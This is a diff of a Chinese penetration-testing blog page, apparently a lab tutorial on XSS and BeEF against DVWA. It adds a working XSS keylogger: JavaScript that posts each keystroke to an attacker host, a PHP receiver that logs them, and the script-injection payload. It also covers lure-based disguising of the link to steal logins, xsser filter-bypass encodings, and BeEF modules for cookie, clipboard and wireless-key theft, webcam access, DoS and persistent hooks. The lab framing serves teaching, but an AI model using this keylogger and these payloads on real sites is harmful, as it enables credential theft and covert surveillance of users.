@@ -496,7 +496,7 @@ Cookie中的变量
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5.7k
+                    7.3k
                 </div>
                 
 
@@ -1540,10 +1540,7 @@ Cookie中的变量
 </ul>
 </blockquote>
 <p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203190825613.png" alt="image-20230203190825613"></p>
-<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>一文看懂xss：</p>
-<p>xss实操：</p>
-<p><a href="https://noobxw.github.io/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/">https://noobxw.github.io/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/</a></p>
-<blockquote>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><blockquote>
 <ul>
 <li><p>攻击WEB客户端</p>
 </li>
@@ -1660,6 +1657,230 @@ WEBSITE IS UNDER ATTACK&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&quot;;&lt;&#x2F;script&
 </li>
 </ul>
 <p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203223011156.png" alt="image-20230203223011156"></p>
+<h3 id="反射型—键盘记录器"><a href="#反射型—键盘记录器" class="headerlink" title="反射型—键盘记录器"></a>反射型—键盘记录器</h3><blockquote>
+<p>攻击流程：</p>
+<p>利用服务器漏洞，攻击者需要社工等欺骗手段将含有xss漏洞的漏洞利用JS程序代码发送给受害者，受害者拿到JS代码后就会在本地提交请求，将JS内容提交给服务器，由于服务器对输入没有进行严格的过滤，对输出也没有进行严格的编码，客户端提交给服务器的代码内容都会原封不动的返回给客户端，返回给客户端后就会进入客户端的浏览器在浏览器中执行，就可以实现攻击客户端计算机。</p>
+</blockquote>
+<p>Keylogger.js</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function-variable function">onkeypress</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">evt</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+evt <span class="token operator">=</span> evt <span class="token operator">||</span> window<span class="token punctuation">.</span>event	
+key <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>evt<span class="token punctuation">.</span>charCode<span class="token punctuation">)</span>  # 记录键盘内容
+<span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+<span class="token keyword">var</span> http <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> param <span class="token operator">=</span> <span class="token function">encodeURI</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
+http<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token string">"http://192.168.216.171/keylogger.php"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	# 发送给指定<span class="token constant">URL</span>
+http<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+http<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"key="</span><span class="token operator">+</span>param<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="搭建实验环境"><a href="#搭建实验环境" class="headerlink" title="搭建实验环境"></a>搭建实验环境</h4><h5 id="在kali中启动Apache"><a href="#在kali中启动Apache" class="headerlink" title="在kali中启动Apache"></a>在kali中启动Apache</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204120032284.png" alt="image-20230204120032284"></p>
+<h5 id="在根目录下写入JS文件"><a href="#在根目录下写入JS文件" class="headerlink" title="在根目录下写入JS文件"></a>在根目录下写入JS文件</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204120311612.png" alt="image-20230204120311612"></p>
+<blockquote>
+<p>JS文件中是让客户端访问kali下的keylogger.php文件</p>
+</blockquote>
+<h5 id="创建keylogger-php"><a href="#创建keylogger-php" class="headerlink" title="创建keylogger.php"></a>创建keylogger.php</h5><blockquote>
+<p>用来接收客户端提交的数据</p>
+</blockquote>
+<p>Keylogger.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$key</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment"># 接收psot请求数据</span>
+<span class="token variable">$logfile</span><span class="token operator">=</span><span class="token string double-quoted-string">"keylog.txt"</span><span class="token punctuation">;</span>
+<span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$logfile</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment"># 将数据写入文件中</span>
+<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204121019626.png" alt="image-20230204121019626"></p>
+<h5 id="创建空白文件"><a href="#创建空白文件" class="headerlink" title="创建空白文件"></a>创建空白文件</h5><blockquote>
+<p>写入客户端提交的数据</p>
+</blockquote>
+<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204122317557.png" alt="image-20230204122317557"></p>
+<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204122343430.png" alt="image-20230204122343430"></p>
+<h4 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h4><h5 id="提交JS注入代码"><a href="#提交JS注入代码" class="headerlink" title="提交JS注入代码"></a>提交JS注入代码</h5><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.216</span><span class="token number">.171</span><span class="token operator">/</span>keylogger<span class="token punctuation">.</span>js<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204121859133.png" alt="image-20230204121859133"></p>
+<blockquote>
+<p>此时已经将JS恶意代码发送到服务器，只要客户端敲击键盘，kali接收端就会将键盘敲击记录写入keylogger.txt</p>
+</blockquote>
+<h5 id="随意敲击键盘"><a href="#随意敲击键盘" class="headerlink" title="随意敲击键盘"></a>随意敲击键盘</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204130615563.png" alt="image-20230204130615563"></p>
+<blockquote>
+<p>可以看到已经记录了客户端敲击的内容；如果客户端输入账户和密码就可以被窃取</p>
+</blockquote>
+<h4 id="伪装注入代码"><a href="#伪装注入代码" class="headerlink" title="伪装注入代码"></a>伪装注入代码</h4><blockquote>
+<p>防止在客户端URL被发现异常，进行伪装注入代码</p>
+</blockquote>
+<h5 id="创建html文件"><a href="#创建html文件" class="headerlink" title="创建html文件"></a>创建html文件</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204131025543.png" alt="image-20230204131025543"></p>
+<blockquote>
+<p>其中xss可以修改为诱惑性的词语，比如：抢苹果手机等等</p>
+<p><strong>前提是需要客户端已经登录进页面</strong></p>
+</blockquote>
+<h5 id="点击超链接"><a href="#点击超链接" class="headerlink" title="点击超链接"></a>点击超链接</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204131515394.png" alt="image-20230204131515394"></p>
+<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204131526527.png" alt="image-20230204131526527"></p>
+<blockquote>
+<p>点击之后会跳转到此页面</p>
+</blockquote>
+<h5 id="随意敲击键盘-1"><a href="#随意敲击键盘-1" class="headerlink" title="随意敲击键盘"></a>随意敲击键盘</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204131703060.png" alt="image-20230204131703060"></p>
+<blockquote>
+<p>xss键盘记录器就是以上思路及流程</p>
+</blockquote>
+<h3 id="xsser"><a href="#xsser" class="headerlink" title="xsser"></a>xsser</h3><blockquote>
+<ul>
+<li>命令行 &#x2F; 图形化 工具</li>
+<li>绕过服务器端输入筛选<ul>
+<li>10进制 &#x2F; 16进制 编码</li>
+<li>unescape()</li>
+</ul>
+</li>
+<li>–heuristic 检查被过滤的字符</li>
+</ul>
+</blockquote>
+<h4 id="图形化"><a href="#图形化" class="headerlink" title="图形化"></a>图形化</h4><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204132529916.png" alt="image-20230204132529916"></p>
+<h4 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h4><ul>
+<li><p><code>xsser -u &quot;http://1.1.1.1/dvwa/vulnerabilities/&quot; -g &quot;xss_r/?name=&quot; --cookie=&quot;security=low; PHPSESSID=bde2205b1b71464b420f6a92b2001def&quot; -s -v --reverse-check</code></p>
+<blockquote>
+<p>-u：不是完整的url，<code>http://1.1.1.1/dvwa/vulnerabilities/</code></p>
+<p>-g：表示使用Get方法，<code>xss_r/?name=</code></p>
+<p>-s：xss测试结束后进行统计</p>
+<p>-v：显示详细信息</p>
+<p>–reverse-check：如果不加这个参数xsser会只发送一个hash值给服务器，查看是否能将该hash原封不动的返回回来。此时可能会有一个问题：服务器没有过滤hash值，但过滤了html(js)代码，造成了xsser显示有xss漏洞，但是不能真正利用。加这个参数后xsser会再发送一个真正的js脚本来检测(发送的js脚本功能为主动连接自己某个端口，如果xsser发现将js发送过去后它又来连接自己制定端口了就说明对方存在xss漏洞)。</p>
+<p>格式如上，与其他工具的url命令有所不同</p>
+</blockquote>
+</li>
+</ul>
+<h5 id="对payload编码，绕过过滤"><a href="#对payload编码，绕过过滤" class="headerlink" title="对payload编码，绕过过滤"></a>对payload编码，绕过过滤</h5><blockquote>
+<ul>
+<li>–Str Use method String.FromCharCode()</li>
+<li>–Une Use Unescape() function</li>
+<li>–Mix Mix String.FromCharCode() and Unescape()</li>
+<li>–Dec Use Decimal encoding</li>
+<li>–Hex Use Hexadecimal encoding</li>
+<li>–Hes Use Hexadecimal encoding, with semicolons</li>
+<li>–Dwo Encode vectors IP addresses in DWORD</li>
+<li>–Doo Encode vectors IP addresses in Octal</li>
+<li>–Cem&#x3D;CEM Try -manually- different Character Encoding Mutations(reverse obfuscation: good) -&gt; (ex: ‘Mix,Une,Str,Hex’)</li>
+<li>注入技术（多选）<ul>
+<li>–Coo Cross Site Scripting Cookie injection </li>
+<li>–Xsa Cross Site Agent Scripting </li>
+<li>–Xsr Cross Site Referer Scripting </li>
+<li>–Dcp Data Control Protocol injections </li>
+<li>–Dom Document Object Model injections </li>
+<li>–Ind HTTP Response Splitting Induced code </li>
+<li>–Anchor Use Anchor Stealth payloader (DOM shadows!) </li>
+<li>–Phpids PHP - Exploit PHPIDS bug (0.6.5) to bypass filters</li>
+<li>–Doss XSS Denial of service (server) injection </li>
+<li>–Dos XSS Denial of service (client) injection </li>
+<li>–B64 Base64 code encoding in META tag (rfc2397) </li>
+<li>–Onm ONM - Use onMouseMove() event to inject code </li>
+<li>–Ifr Use <iframe> source tag to inject code</iframe></li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<blockquote>
+<p>kali安装的xsser出现了问题，老是报找不到攻击点的错误，导致测试实例不成功，就不放截图了</p>
+</blockquote>
+<h3 id="其他类型XSS文章及实操"><a href="#其他类型XSS文章及实操" class="headerlink" title="其他类型XSS文章及实操"></a>其他类型XSS文章及实操</h3><p>一文看懂xss：</p>
+<p><a href="https://noobxw.github.io/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/">https://noobxw.github.io/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/</a></p>
+<p>xss实操：</p>
+<p><a href="https://noobxw.github.io/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/">https://noobxw.github.io/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/</a></p>
+<h2 id="BEEF"><a href="#BEEF" class="headerlink" title="BEEF"></a>BEEF</h2><blockquote>
+<ul>
+<li>浏览器攻击面<ul>
+<li>应用普遍转移到B &#x2F; S架构，浏览器成为统一客户端程序</li>
+<li>结合社会工程学方法对浏览器进行攻击</li>
+<li>攻击浏览器用户</li>
+<li>通过注入的JS脚本，利用浏览器攻击其他网站</li>
+</ul>
+</li>
+<li>BeEF（Browser exploitation framework）<ul>
+<li>生成、交付payload</li>
+<li>Ruby语言编写</li>
+<li>服务器端：管理hooked客户端</li>
+<li>客户端：运行于客户端浏览器的 Javascript 脚本（hook）</li>
+</ul>
+</li>
+<li>攻击手段<ul>
+<li>利用网站xss漏洞实现</li>
+<li>诱使客户端访问含有hook的伪造站点</li>
+<li>结合中间人攻击注入hook脚本</li>
+</ul>
+</li>
+<li>常见用途<ul>
+<li>键盘记录器</li>
+<li>网络扫描</li>
+<li>浏览器信息搜集</li>
+<li>绑定shell</li>
+<li>与 metasploit 集成</li>
+</ul>
+</li>
+<li>BeEF上线页面<ul>
+<li>Details：<ul>
+<li>浏览器、插件版本信息；操作系统信息</li>
+</ul>
+</li>
+<li>Logs：<ul>
+<li>浏览器动作：焦点变化、鼠标点击、信息输入</li>
+</ul>
+</li>
+<li>Commands：命令模块<ul>
+<li>绿色模块：表示模块适合目标浏览器，并且执行结果被客户端不可见</li>
+<li>红色模块：表示模块不适用于当前用户，有些红色模块也可正常执行</li>
+<li>橙色模块：模块可用，但结果对用户可见（CAM弹窗申请权限等）</li>
+<li>灰色模块：模块未在目标浏览器上测试过</li>
+</ul>
+</li>
+<li>主要模块<ul>
+<li>Browsers</li>
+<li>Exploits </li>
+<li>Host</li>
+<li>Persistence</li>
+<li>Network</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h3 id="利用BeEF进行攻击"><a href="#利用BeEF进行攻击" class="headerlink" title="利用BeEF进行攻击"></a>利用BeEF进行攻击</h3><h4 id="使用存储型xss注入-hook-js"><a href="#使用存储型xss注入-hook-js" class="headerlink" title="使用存储型xss注入 hook.js"></a>使用存储型xss注入 hook.js</h4><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204213346896.png" alt="image-20230204213346896"></p>
+<ul>
+<li>在BeEF处查看</li>
+</ul>
+<blockquote>
+<p>目标主机已经上线</p>
+</blockquote>
+<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204213614116.png" alt="image-20230204213614116"></p>
+<h4 id="Broswer模块"><a href="#Broswer模块" class="headerlink" title="Broswer模块"></a>Broswer模块</h4><h5 id="开启客户端摄像头"><a href="#开启客户端摄像头" class="headerlink" title="开启客户端摄像头"></a>开启客户端摄像头</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204220102520.png" alt="image-20230204220102520"></p>
+<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204220221182.png" alt="image-20230204220221182"></p>
+<h5 id="Get-Cookie"><a href="#Get-Cookie" class="headerlink" title="Get Cookie"></a>Get Cookie</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204220328344.png" alt="image-20230204220328344"></p>
+<h4 id="Exploits模块"><a href="#Exploits模块" class="headerlink" title="Exploits模块"></a>Exploits模块</h4><h5 id="Apache-Cookie-泄露漏洞"><a href="#Apache-Cookie-泄露漏洞" class="headerlink" title="Apache Cookie 泄露漏洞"></a>Apache Cookie 泄露漏洞</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204220706126.png" alt="image-20230204220706126"></p>
+<h5 id="路由器的CSRF漏洞"><a href="#路由器的CSRF漏洞" class="headerlink" title="路由器的CSRF漏洞"></a>路由器的CSRF漏洞</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204220956419.png" alt="image-20230204220956419"></p>
+<h4 id="Host模块"><a href="#Host模块" class="headerlink" title="Host模块"></a>Host模块</h4><h5 id="Get-Wireless-Keys获取无线密钥"><a href="#Get-Wireless-Keys获取无线密钥" class="headerlink" title="Get Wireless Keys获取无线密钥"></a>Get Wireless Keys获取无线密钥</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204221427875.png" alt="image-20230204221427875"></p>
+<h5 id="Get-Clipboard获取粘贴板"><a href="#Get-Clipboard获取粘贴板" class="headerlink" title="Get Clipboard获取粘贴板"></a>Get Clipboard获取粘贴板</h5><blockquote>
+<p>将客户端复制内容的粘贴板获取到，拿到粘贴板内容</p>
+</blockquote>
+<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204221537609.png" alt="image-20230204221537609"></p>
+<h4 id="Network模块"><a href="#Network模块" class="headerlink" title="Network模块"></a>Network模块</h4><h5 id="DOSer拒绝服务"><a href="#DOSer拒绝服务" class="headerlink" title="DOSer拒绝服务"></a>DOSer拒绝服务</h5><blockquote>
+<p>填写目标URL等信息；</p>
+<p>将hook的浏览器当作僵尸机使用；</p>
+</blockquote>
+<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204221741710.png" alt="image-20230204221741710"></p>
+<h5 id="Port-Scanner端口扫描"><a href="#Port-Scanner端口扫描" class="headerlink" title="Port Scanner端口扫描"></a>Port Scanner端口扫描</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204222316251.png" alt="image-20230204222316251"></p>
+<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204222909398.png" alt="image-20230204222909398"></p>
+<h4 id="Persistence持久hook"><a href="#Persistence持久hook" class="headerlink" title="Persistence持久hook"></a>Persistence持久hook</h4><blockquote>
+<p>当客户端关掉当前页面，此时的hook将失效；</p>
+<p>一旦hook一个用户，第一时间创建持久hook</p>
+</blockquote>
+<h5 id="Create-Close-Tab"><a href="#Create-Close-Tab" class="headerlink" title="Create Close Tab"></a>Create Close Tab</h5><blockquote>
+<p>如果客户端关闭当前页面，执行Create Close Tab后，客户端会显示一个confirm对话框；当客户端再次关闭当前页面还会显示confirm对话框</p>
+</blockquote>
+<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204223225740.png" alt="image-20230204223225740"></p>
+<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204223211564.png" alt="image-20230204223211564"></p>
+<h5 id="Create-Pop-Under"><a href="#Create-Pop-Under" class="headerlink" title="Create Pop Under"></a>Create Pop Under</h5><blockquote>
+<p>执行此命令会在客户端出现新的窗口，并且beef页面会出现新的相同连接，新的连接是由小窗口直接建立连接</p>
+</blockquote>
+<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204223408304.png" alt="image-20230204223408304"></p>
+<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204223501945.png" alt="image-20230204223501945"></p>
 
                 
             </div>
@@ -2097,7 +2318,7 @@ WEBSITE IS UNDER ATTACK&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&quot;;&lt;&#x2F;script&
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">187.1k</span>
+                        class="white-color">190.2k</span>
             
             
             
